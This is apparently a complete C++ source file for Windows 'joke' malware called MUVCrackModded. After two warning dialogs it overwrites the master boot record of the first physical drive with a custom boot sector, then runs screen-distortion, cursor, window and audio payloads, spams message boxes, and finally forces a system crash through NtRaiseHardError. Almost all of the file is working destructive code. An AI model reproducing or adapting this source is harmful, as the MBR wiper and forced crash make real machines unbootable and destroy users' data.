// MUVCrackModded.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
// The code has been modded and cleaned up by Jazzstuff.

#include <Windows.h>
#include <math.h>
#pragma comment(lib, "winmm.lib")
#define M_PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
const unsigned char MasterBootRecord[] = { 0xB8, 0x03, 0x00, 0xCD, 0x10, 0xB4, 0x01, 0xB0, 0x20, 0xB7, 0x00, 0xB3, 0x4F, 0xB9, 0xD0, 0x07, 
0xCD, 0x10, 0xBE, 0x87, 0x7C, 0xE8, 0x0E, 0x00, 0xB4, 0x00, 0xCD, 0x16, 0xE8, 0x13, 0x00, 0xE8, 
0x1E, 0x00, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4, 0x0E, 0xAC, 0x3C, 0x00, 0x74, 0x04, 0xCD, 0x10, 0xEB, 
0xF7, 0xC3, 0xB4, 0x09, 0xB0, 0x20, 0xB7, 0x00, 0xB3, 0x00, 0xB9, 0xD0, 0x07, 0xCD, 0x10, 0xC3, 
0xBE, 0x85, 0x7C, 0xB9, 0x03, 0x00, 0xE8, 0x09, 0x00, 0xE8, 0x27, 0x00, 0xE8, 0x30, 0x00, 0xE2, 
0xF5, 0xC3, 0xB4, 0x09, 0xB0, 0x20, 0xB7, 0x00, 0x8A, 0x1E, 0x8A, 0x7C, 0xB9, 0xD0, 0x07, 0xCD, 
0x10, 0x80, 0x06, 0x8A, 0x7C, 0x10, 0x80, 0x3E, 0x8A, 0x7C, 0xCF, 0x76, 0x05, 0xC6, 0x06, 0x8A, 
0x7C, 0x4F, 0xC3, 0xB4, 0x0E, 0xAC, 0x3C, 0x00, 0x74, 0x04, 0xCD, 0x10, 0xEB, 0xF7, 0xC3, 0xB9, 
0xFF, 0xFF, 0xE2, 0xFE, 0xC3, 0x20, 0x00, 0x0D, 0x0A, 0x00, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 1;
}
DWORD WINAPI WindowMove(LPVOID lpParam) { //credits to Maxi2022gt
	while (true) {
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HWND wnd = GetForegroundWindow();
		MoveWindow(wnd, rand() % w, rand() % h, rand() % w, rand() % h, false);
		Sleep(rand() % 100);
	}
}
DWORD WINAPI CursorMove(LPVOID lpParam) {
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true) {
		SetCursorPos(rand() % x, rand() % y);
		Sleep(500);
	}
}
DWORD WINAPI SplitScreen(LPVOID lpParam) {
        HDC hdc;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x;
        while (true) {
              hdc = GetDC(NULL);
              BitBlt(hdc, rand() % w, 0, 100, h, hdc, rand() % w, 0, SRCCOPY);
              ReleaseDC(NULL, hdc);
        }
}
DWORD WINAPI Swirl(LPVOID lpParam) {
        HDC hdc;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x, y;
        float i = 0;
        int i2 = 0;
        while (true) {
              hdc = GetDC(NULL);
              BitBlt(hdc, cos(i / 4) * 20, i2 * 10 % h, w, 10, hdc, 0, i2 * 10 % h, SRCCOPY);
              BitBlt(hdc, i2 * 10%w, cos(i / 4) * 20, 10, h, hdc, i2 * 10 % w, 0, SRCCOPY);
              i++;
              i2++;
              ReleaseDC(NULL, hdc);
        }
}
DWORD WINAPI IconWave(LPVOID lpParam) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x, y;
        float i = 0;
        while (true) {
              HDC hdc = GetDC(NULL);
              DrawIcon(hdc, sin(i / 63) * (w/2) + (w/2), cos(i / 64) * (h / 2) + (h / 2), LoadIcon(NULL, IDI_APPLICATION));
              DrawIcon(hdc, cos(i / 63) * (w / 2) + (w / 2), sin(i / 64) * (h / 2) + (h / 2), LoadIcon(NULL, IDI_WARNING));
              DrawIcon(hdc, tan(i / 0.99) * (w / 2) + (w / 2), sin(i/1.01) * (h / 2) + (h / 2), LoadIcon(NULL, IDI_QUESTION));
              PatBlt(hdc, rand() % w, rand() % h, 100, 100, PATCOPY);
              DrawIcon(hdc, sin(i) * (w/1.5) + (w/2), tan(-i ) * (h / 2) + (h / 2), LoadIcon(NULL, IDI_ERROR));
              i++;
              ReleaseDC(0, hdc);
              DeleteDC(hdc);
        }
}
DWORD WINAPI SetPixel1(LPVOID lpParam) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x = 0, y = 0;
        float i = 0;
        while (true) {
              int fishy = rand() % 4;
              HDC hdc = GetDC(NULL);
              x++;
              if (x > w) {
                  x = 0;
                  y += 5;
              }
              if (y > h) {
                  y = 0;
                  x = 0;
              }
              SetPixel(hdc,x,y, RGB((rand() % 2) * 255, (rand() % 2) * 255, (rand() % 2) * 255));
              SetPixel(hdc, x, y+1, RGB((rand() % 2) * 255, (rand() % 2) * 255, (rand() % 2) * 255));
              SetPixel(hdc, x, y + 2, RGB((rand() % 2) * 255, (rand() % 2) * 255, (rand() % 2) * 255));
              SetPixel(hdc, x, y + 3, RGB((rand() % 2) * 255, (rand() % 2) * 255, (rand() % 2) * 255));
              SetPixel(hdc, x, y + 4, RGB((rand() % 2) * 255, (rand() % 2) * 255, (rand() % 2) * 255));
              i += 1;
              ReleaseDC(0, hdc);
              DeleteDC(hdc);
         }
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[24000 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t | t >> 6) * 10 + (t / 128);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * (t * t & t * 9 % 257 - (t ^ t * 2) | t >> 8) & ~t >> 4) * (t >> 12 & 1) & 255) / 2 + (t * ((t >> 14 & 3) + 1) * ((~t >> 9 & 3) + 1) & 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * 90 / (int(t * t / 800 & 4095) + 1));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t / 512 | t >> 4 | t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI FishyMessage(LPVOID lpParam) {
      while (true) {
           MessageBoxW(NULL, L"fish", L"fish", MB_OK);
           MessageBoxW(NULL, L"puarco", L"puarco", MB_OK);
      }
      return 1;
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"This is a Malware, Do you want to run this?", L"MUVCrack.exe (better version by Jazzstuff)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? It will destroy your computer and will display flashing lights", L"F?i?n?a?l? ?W?a?r?n?i?n?g? - MUVCrackModded.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			CreateThread(0, 0, WindowMove, 0, 0, 0);
			CreateThread(0, 0, CursorMove, 0, 0, 0);
			CreateThread(0, 0, FishyMessage, 0, 0, 0);
			Sleep(1000);
			HANDLE thread1 = CreateThread(0, 0, SplitScreen, 0, 0, 0);
			//HANDLE thread1dot1 = CreateThread(0, 0, blur, 0, 0, 0);
			sound1();
			Sleep(20000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, Swirl, 0, 0, 0);
			//HANDLE thread1dot1 = CreateThread(0, 0, blur, 0, 0, 0);
			sound2();
			Sleep(20000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, IconWave, 0, 0, 0);
			//HANDLE thread1dot1 = CreateThread(0, 0, blur, 0, 0, 0);
			sound3();
			Sleep(20000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, SetPixel1, 0, 0, 0);
			//HANDLE thread1dot1 = CreateThread(0, 0, blur, 0, 0, 0);
			sound4();
			Sleep(20000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC0000307, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}
